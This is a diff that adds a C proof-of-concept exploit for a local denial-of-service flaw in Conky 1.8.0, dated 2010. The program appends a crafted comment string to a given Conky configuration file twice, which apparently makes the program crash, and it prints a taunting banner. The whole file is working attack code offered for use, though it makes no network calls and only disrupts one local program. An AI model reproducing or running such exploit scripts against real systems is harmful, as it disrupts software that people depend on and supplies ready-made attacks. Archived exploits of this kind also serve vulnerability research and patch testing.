@@ -1,0 +1,55 @@
+/*                                                      */
+/*  Vulnerability Conky 1.8.0 on Linux                  */
+/*   Tested on: Linux with kernel 2.6.32.1-smp          */
+/*       Found: by Arturo D'Elia                        */
+/*  Date found: 12 Dec 2010                             */
+/*         Fix: No Fix                                  */
+/*    Contacts: arturo.delia@libero.it                  */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+char killyou[]=  "# w000wwwww i exploit it and i kill you!";
+
+int main( int argc, char **argv){
+
+    FILE *fp;
+
+    /*  Write the information program*/
+    printf("\n[*] Conky 1.8.0 Local DoS/PoC Exploit [*]\n");
+    printf("[*]       Coded by: Arturo D'Elia\n");
+    printf("[*]      Tested on: Linux\n");
+    printf("[*] Kernel version: 2.6.32.1-smp\n");
+    printf("[*]      Bug Found: 12 Dec 2010\n");
+    printf("[*]       Contacts: arturo.delia@libero.it\n\n");
+
+    /*  Check the input parameter   */
+    if(argc!=2)
+        exit(fprintf(stderr,"Usage: %s < path conkyrc >\n",argv[0]));
+
+    /*  Check file exsist           */
+    printf("[>] Open conky configuration\n");
+    if((fp=fopen(argv[1],"r"))==NULL)
+        exit(fprintf(stderr,"[x] Cannot open %s file\n",argv[1]));
+    fclose(fp);
+
+    /*  Open file for append and i send it the  */
+    /*  exploited strings                       */
+    fp=fopen(argv[1],"a");
+    printf("[>] Send the DoS/PoC string\n");
+    fprintf(fp,"%s\n",killyou);
+    fclose(fp);
+
+    /*  Wait 3 seconds              */
+    usleep(3000000);
+
+    /*  Resend exploited strings    */
+    fp=fopen(argv[1],"a");
+    fprintf(fp,"%s\n",killyou);
+    fclose(fp);
+
+    /*  Ok guy.                     */
+    printf("[*] Ok guy, you kill it.\n\n");
+return 0;
+}
